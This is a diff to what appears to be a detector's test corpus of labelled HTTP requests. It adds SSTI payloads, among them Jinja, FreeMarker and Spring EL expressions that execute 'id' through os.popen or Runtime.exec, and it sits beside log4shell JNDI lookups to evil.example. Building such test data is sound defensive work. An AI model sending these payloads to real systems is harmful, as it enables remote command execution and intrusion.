@@ -108,6 +108,12 @@
 {"name":"go define action","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{define \"x\"}}{{.}}{{end}}"]],"headers":{},"content_type":"","body":""}
 {"name":"el arithmetic","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${7*7}"]],"headers":{},"content_type":"","body":""}
 {"name":"el member access","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${user.password}"]],"headers":{},"content_type":"","body":""}
+{"name":"jinja attr filter call","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{ request|attr('application') }}"]],"headers":{},"content_type":"","body":""}
+{"name":"jinja config concat leak","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{ [x]|list +config|dictsort }}"]],"headers":{},"content_type":"","body":""}
+{"name":"call before inner braces","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{ lipsum.__globals__.os.popen('id').read() ~ {{a|b}} }}"]],"headers":{},"content_type":"","body":""}
+{"name":"freemarker one-letter call","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<#assign t=\"freemarker.template.utility.Execute\"?new()>${t(\"id\")}"]],"headers":{},"content_type":"","body":""}
+{"name":"hash el runtime","category":"ssti","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"note\":\"#{T(java.lang.Runtime).getRuntime().exec(\\\"id\\\")}\"}"}
+{"name":"hash el quoted product","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","#{7*'7'}"]],"headers":{},"content_type":"","body":""}
 {"name":"jndi in user-agent","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"${jndi:ldap://evil.example/a}"},"content_type":"","body":""}
 {"name":"obfuscated jndi","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"X-Api-Version":"${${lower:j}ndi:${lower:l}dap://evil.example/a}"},"content_type":"","body":""}
 {"name":"jndi in query","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${jndi:rmi://evil.example/x}"]],"headers":{},"content_type":"","body":""}
